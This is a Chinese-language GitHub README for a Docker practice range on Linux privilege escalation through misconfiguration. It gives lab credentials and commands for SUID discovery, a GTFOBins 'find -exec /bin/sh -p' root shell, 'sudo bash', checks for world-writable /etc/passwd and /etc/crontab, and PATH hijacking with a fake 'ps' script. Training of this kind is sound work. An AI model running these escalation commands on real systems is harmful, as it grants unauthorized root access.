# linux-elevate-hub
适用于linux提权的练习靶场（非系统漏洞提权）
## 构建镜像
```
docker build 
```
## 演示
### 登陆普通用户ssh
zhangsan/123456
### suid提权
1. 搜索suid权限的文件
   ```
   find / -perm -u=s -type f 2>/dev/null
   ```
<img width="713" alt="image" src="https://github.com/user-attachments/assets/623f6c84-99aa-4785-9fe0-ff7144f3bb5e">

2. 使用find命令进行 suid 提权
参考：https://gtfobins.github.io
```
find . -exec /bin/sh -p \; -quit
```
<img width="880" alt="image" src="https://github.com/user-attachments/assets/2499a2a7-cb50-4687-ba21-7777ff1f607a">

### sudo 提权
1. 查看当前用户的sudo权限
   ```
   sudo -l
   ```
<img width="1419" alt="image" src="https://github.com/user-attachments/assets/aaf6ff9f-7101-470c-8c14-98bb188bb716">

2. sudo 提权
```
sudo bash
```

### 配置错误提权
#### 用户文件权限配置错误
> emmmm 这种提权就很迷
1. 查看 `/etc/passwd` 文件权限
   ```
   ls -l /etc/passwd 
   ```
发现所有用户对 /etc/passwd 可写

#### 计划任务文件权限配置错误
> emmmm 这种提权就很迷
1. 查看 `/etc/crontab` 文件权限
   ```
   ls -l /etc/crontab 
   ```
发现所有用户对 /etc/crontab 可写
### 环境变量提权
1. 搜索suid权限的文件
   ```
   find / -perm -u=s -type f 2>/dev/null
   ```
<img width="713" alt="image" src="https://github.com/user-attachments/assets/623f6c84-99aa-4785-9fe0-ff7144f3bb5e">

2. 运行shell文件 ，发现输出疑似 `ps` 命令的结果
3. 创建一个新的ps文件，内容为 /bin/bash，最后修改环境变量
```
cd /tmp
echo "/bin/bash" > ps
chmod u+x ps
export PATH=/tmp:$PATH
```
4. 再次运行shell文件，成功提权
<img width="766" alt="image" src="https://github.com/user-attachments/assets/a95e1a72-e29f-4dea-a1b4-752be58de500">
